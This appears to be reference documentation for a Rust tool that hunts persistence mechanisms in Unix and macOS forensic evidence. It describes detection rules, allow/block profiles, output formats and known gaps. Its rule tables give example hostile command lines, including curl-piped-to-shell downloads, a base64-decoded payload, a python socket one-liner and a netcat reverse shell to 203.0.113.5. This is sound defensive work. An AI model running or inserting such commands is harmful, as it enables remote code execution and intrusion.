| runs from a world-writable or temporary directory | A command word or interpreter script is under `/tmp`, `/var/tmp`, `/dev/shm`, `/private/tmp`, `/private/var/tmp` or `/users/shared` (any case), or under a macOS per-user `/var/folders/*/*/T`. A `./` file runs after `cd` into one of these | `/tmp/.x/payload --daemon` |
| runs from a hidden path | A command word or interpreter script has a path part that starts with `.` followed by a letter, digit or `_`, unless the name is on a fixed list of ordinary names (for example `.ssh`, `.config`, `.cache`, `.cargo`, `.oh-my-zsh`, `.well-known`) | `~/.hidden/agent --quiet` |
| downloads and executes code | `curl` or `wget` piped into a shell or interpreter; or a file that `curl` or `wget` saved is later made executable with `chmod` or run; or the output of `curl` or `wget` is given through `$(...)` or `<(...)` to a shell, `eval`, `source` or `.` | `curl -fsSL http://203.0.113.5/i.sh \| sh` |
| decodes an encoded payload | `base64` with `-d`, `-D` or `--decode`; `openssl enc` with `-d` and `base64` or `enc`; `xxd -r` | `echo aGk= \| base64 -d \| sh` |
| inline interpreter with network or encoded code | `python*`, `perl`, `ruby` or `node` with `-c` or `-e`, or `php` with `-r`, where the code contains `socket`, `/dev/tcp/`, `pty.spawn`, `urlopen`, `b64decode`, `base64`, `fromhex` or `decompress` | `python3 -c 'import socket,os;s=socket.socket()'` |
| reverse-shell tooling | `nc`, `ncat` or `netcat` with an exec option (`-e`, `-c`, `--exec`, `--sh-exec`, `--lua-exec`); `mkfifo` with netcat; `socat` with `EXEC:`; `/dev/tcp/` or `/dev/udp/` anywhere in the line | `nc -e /bin/sh 203.0.113.5 4444` |
| runs AppleScript from the command line | `osascript` with `-e` or `-l` | `osascript -e 'do shell script "id"'` |

Ordinary lines that the rules deliberately do not flag. Each is from the benign test table:

| Command line | Why it is not flagged |
|---|---|
| `find /var/tmp -type f -mtime +7 -delete` | A temporary path is an argument, not the command |
| `rm -rf /tmp/build-cache` | Same |
| `curl -fsS https://example.com/health > /var/lib/app/health` | Download without execution |
| `curl -s https://example.com/api \| jq .` | Pipe into a command that is not a shell or interpreter |
| `curl https://example.com/.well-known/security.txt` | `.well-known` is on the list of ordinary hidden names |
| `[ -f ~/.bash_aliases ] && . ~/.bash_aliases` | A dotfile is sourced, not run. Only command words and interpreter scripts count |
| `source ~/.iterm2_shell_integration.zsh` | Same |
| `cd / && ./run.sh` | A relative run is flagged only after `cd` into a temporary directory |
| `VAR=$(curl -s https://example.com/api)` | Assignment, not execution |
| `curl -s -o /var/lib/app/f.json https://example.com/f; chmod 600 /var/lib/app/f.json` | `chmod` without an executable bit |
| `python3 -c 'print(1)'` | Inline code with no network or encoded content |
| `base64 /etc/hostname` | Encoding, not decoding |
| `# curl http://203.0.113.9/x \| sh and /tmp/x` | Comment, removed before the rules run |
| `HISTFILE=${ZDOTDIR:-$HOME}/.zsh_history` | Stock shell startup line |
| `test -x /usr/sbin/anacron \|\| ( cd / && run-parts --report /etc/cron.daily )` | Stock cron line |
| `/usr/bin/timeout 5 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron` | Wrapper with a duration; system path |

An empty line and `exit 0` are not flagged either.

## Profile

A profile is a YAML file with two optional keys, `allow` and `block`. Unknown keys are errors.
The example below is valid for the profile structs in `hunt.rs`:

```yaml
# Allowed rows are hidden unless --show-allowed is given. The first matching entry wins.
allow:
  # Every key present must match. Glob patterns: * is any run of characters, ? is one.
  - check: systemd-*
    path: etc/systemd/system/updater.service
    reason: Corporate update agent
  # contains matches the row's detail or the text of what the record runs, not the whole record.
  - contains: /usr/local/bin/startup-check
    host: build-*
    reason: Site startup check
  # One key is enough when a whole check is accepted on a set of hosts.
  - check: authorized-key-root
    host: backup-*
    reason: Backup host manages root keys by policy

# Matched against every string value in each record. Blocked rows are flagged even when no
# check matches the record.
block:
  - contains: backup.sh --target
    title: Known bad backup script
    technique: T1105
```

### Allow entries

| Key | Meaning | Matched against |
|---|---|---|
| `check` | Glob on the check id | The row's check id. Block rows have check id `block-rule` |
| `host` | Glob on the host name | The record's `host` |
| `path` | Glob on the source path | The row's `source_path` |
| `contains` | Case-sensitive substring | The row's `detail`, or the executable text of the record. Executable text is the values of `command`, `program`, `program_arguments`, `arguments`, `exec`, `exec_start`, `exec_start_pre`, `exec_start_post`, `exec_stop`, `exec_reload`, `text`, `path`, `executable`, `executable_path`, `forced_command` and `module`. Other fields are not searched. For a block row the detail is ``record contains `...` ``, so the entry's text can match there too |
| `reason` | Text copied to the `reason` column of the matched row | Not matched |

Glob rules: `*` matches any run of characters, including `/`; `?` matches one character;
matching is case-sensitive and must cover the whole value.

### Block entries

| Key | Meaning | Matched against |
|---|---|---|
| `contains` | Required. Case-sensitive substring | Every string value in the parsed record, including `host` and `source_path`. Keys are not searched |
| `title` | Title of the row | Not matched. Default `Matches a block rule` |
| `technique` | ATT&CK technique of the row | Not matched. Default empty |

Each block entry that matches gives its own row. A block row has severity `high` and an empty
tactic.

### Validation

All of these are usage errors: the command prints `nixcavate: profile <path>: ...` on stderr,
writes nothing to stdout, and exits 2.

| Condition | Result |
|---|---|
| Top-level key other than `allow` or `block` | Error. The message names the key |
| Key other than the ones listed above, in an entry | Error. The message names the key |
| Not valid YAML, or the wrong shape (for example `allow: yes`) | Error |
| `allow` or `block` present with no value | No entries |
| Allow entry with none of `check`, `host`, `path`, `contains` (a key with no value counts as absent) | Error: `needs one of check, host, path, contains`. This includes an entry that has only `reason` |
| Allow selector set to an empty string | Error: `has an empty selector`. An empty selector would match every finding |
| Block entry with `contains` missing or empty | Error |
| Profile file cannot be read | Error |

An empty or whitespace-only file is read as a profile with no entries.

## Output

Columns, in order. The same names are used as CSV header cells and as JSON keys:

| Column | Meaning |
|---|---|
| `host` | Host name of the record |
| `severity` | `info`, `low`, `medium` or `high` |
| `check` | Check id, or `block-rule` |
| `technique` | ATT&CK technique ID. Empty for a block row with no `technique` |
| `tactic` | ATT&CK tactic, such as `Persistence`. Empty for a block row |
| `title` | Check title, or the block entry's `title` |
| `status` | `finding`, `blocked` or `allowed`. See below |
| `detail` | Why the record matched: the reason from the check, or ``record contains `...` `` for a block row. Control characters are written as escapes; tab is kept |
| `artifact` | Artifact id of the record |
| `source_path` | Input path, relative to the host root |
| `source_line` | 1-based line of the record, or empty when the record has none |
| `source_offset` | Byte offset of the record in the decompressed input, or empty |
| `evidence` | The whole parsed record as compact JSON text. In JSON and JSONL it is a string that holds JSON, not a nested object. A systemd unit record and a default-account sudo rule also carry the `joined` object of the join pass |
| `reason` | The `reason` of the allow entry that matched, or empty |

`status` values:

| Value | Meaning |
|---|---|
| `finding` | A check matched, and no allow entry matched |
| `blocked` | A block entry matched, and no allow entry matched |
| `allowed` | An allow entry matched. These rows appear only with `--show-allowed` |

Formats:

- **CSV** (default): a header row, then one row per finding. RFC 4180 quoting. An absent value
  is an empty cell.
- **JSON**: one array per run. An absent value is `null`.
- **JSONL**: one object per line, with keys in column order. An absent value is `null`.

With no findings, CSV has only the header row, JSON is `[]`, and JSONL is empty.

Sort order: host (ascending), then severity (high first), check id, `source_path`,
`source_line`, `source_offset`. See step 5 under How it works.

Summary on stderr, unless `-q` is given. Counts cover the rows written, so they follow
`--min-severity` and `--show-allowed`. The `allowed` count is zero unless `--show-allowed` is
given. For the macOS fixture:

```
persistence-hunter: 20 findings (8 high, 8 medium, 4 low, 0 info), 0 allowed
  top checks: launchd-suspicious-program x3, startup-item x2, auth-db-admin-rule-allow x1, authorization-plugin x1, btm-item-unsigned x1
```

The second line lists up to five check ids of the non-allowed rows, most rows first, then by
check id. It is omitted when there are no rows.

Exit codes:

| Code | Meaning |
|---|---|
| 0 | The run completed; every parser task succeeded or was skipped |
| 1 | The run completed; at least one parser task failed. Its findings are still written |
| 2 | The run could not start or finish: bad arguments, a profile error, unreadable or missing evidence, an existing `-o` file without `-C`, or a write error. Clap usage errors also exit 2 |

## Not detected

Persistence a run does not report, by design or because the evidence format does not allow it.
Items marked with the harness name were planted on real virtual machines (17 systems, read as
disk images and as UAC collections).

| What | Why |
|---|---|
| A plain `modules-load.d` or `/etc/modules` entry (harness `NXMK_MODLOAD`) in a UAC collection | The collection has no `lib/modules`, so there is nothing to compare the name with. On disk images it is found (15 of 15 readable images) |
| A module that exists but is malicious, or a real module loaded for a bad reason | The check compares names; it does not judge modules |
| `remove` directives of `modprobe.d` | Stock files use many shapes (`umount`, pipelines into `xargs`); only `install` is judged |
| Content of scripts in `cron.hourly`/`daily`/`weekly`/`monthly` and `init.d` | The parsers read their metadata, not their lines; only ownership and mode are checked |
| `AuthorizedKeysFile` pointing at an odd place, `PermitUserEnvironment`, sshd `Include` files other than `sshd_config.d/*.conf` | Not read |
| `usr/lib/systemd/system-generators` and `usr/lib/systemd/user-generators` | A distribution ships files there; which are stock is not knowable from the evidence |
| `etc/network/if-up.d`, apt hooks (`apt.conf.d`), `dhclient-exit-hooks.d`, `Xsession.d`, `~/.pam_environment`, `etc/rc*.d` links, upstart jobs, Git hooks | No artifact reads them |
| BSD: a plant that is only a comment (an `rc.securelevel`, `csh.cshrc` or `ksh.kshrc` line `# NXMK_...`), a `doas` rule restricted with `cmd`, an `/etc/crontab` job whose command is benign, a planted key in an ordinary user's `authorized_keys`, a module in `boot/modules` that `loader.conf` does not load | Nothing in them is a suspicious command or a broad grant. The plant is in the artifact's records, not in the findings |
| BSD: `etc/inetd.conf`, `etc/pam.d/*`, `etc/syslog.conf` (`\|command` destinations), mail aliases (`\|command`), `etc/powerd/scripts/*` (NetBSD), `.rhosts` and `hosts.equiv` | No artifact reads them (see "Not read" under the BSD heading of LIMITATIONS.md) |
| AIX: SRC subsystems added with `mkssys` (the ODM class `SRCsubsys` is not read), `etc/security/user` settings, `etc/inetd.conf` services that are not shells or suspicious, and any `inittab` entry that runs from a system directory | No ODM reader, and no list of stock AIX entries to compare with |
| Anything the parsers cannot see: memory-only persistence, a kernel module hidden by a rootkit, a changed system binary | Out of scope for a collection of files |

## Limits

- The checks are heuristics for triage. They look at parsed fields and simple text rules, so a
  missed finding is possible, and a finding does not show that the item was used.
- Only the artifacts listed under How it works are parsed. Records that a parser cannot read
  produce no rows, and a failed parser task sets exit code 1.
- The checks are compiled Rust functions. A new check needs a code change; a profile cannot add
  one.
- Ownership checks are not meaningful in directory mode. `cron-script-writable` tests the owner
  uid of each file. Files extracted by a non-root user belong to that user, so the owner part of
  the check fires for every script. The test suite excludes this check from directory runs for
  that reason. Use `-f` with an archive to keep the owners recorded in the archive.
- systemd: enablement is read from the links in `etc/` and in home directories only. `Alias=`
  and `Also=` inside a unit file are not read, only the links; `.target` units are left out; a
  unit file that is read from a place no link or timer names is reported as `not-enabled` only
  when links of that scope were collected. A collection that did not keep symlinks (a copy
  that followed or dropped them) gives no enablement claim.
- The first pass keeps the exec lines of units and the links in memory, 4 KiB at most per
  line; it does not limit their number.
- `modules-load-unknown-module` needs the kernel tree (`lib/modules` or `usr/lib/modules`)
  in the evidence. Disk images have it; a UAC collection does not, so a plain
  `modules-load.d` entry is not detected there (a `modprobe.d` `install` line is).
- `kext-third-party` matches every kernel extension record. The artifact is described as
  third-party extensions, and the check does not test the vendor. System extensions are not
  checked.
- `btm` key names come from a macOS 26 store layout, and the parser matches them tolerantly.
  Items in other layouts may not be read at all.
- `emond` rules are deprecated. The parser reads them where they are still present, and the
  `emond-rule-command` check covers those rules only.
- The macOS checks added with the login-window, `auth.db`, StartupItems, rc, Folder Action,
  plug-in and configuration-profile artifacts rest on synthetic fixtures only (see
  `docs/LIMITATIONS.md`). Not checked: other `auth.db` rules and mechanisms (no citable
  default), Dock tile plug-ins, Automator Quick Actions, `Application Scripts`, the Folder
  Actions dispatcher plist, and profile payloads other than root certificates.
- The launchd `keep_alive` test reads the value only as text: a `KeepAlive` that is not text
  does not make `launchd-user-agent-persistent` match. `run_at_load` must be a boolean `true`.
- Findings carry no timestamps. Time values of the records appear only inside `evidence`.
- Block entries apply only to records of the artifacts listed under How it works, because other artifacts are
  not parsed.
- Allow entries match text in the fields listed under `contains`. A value planted in another
  field, such as a log path, does not allow a finding.
- `-K` is accepted and has no effect on this command.
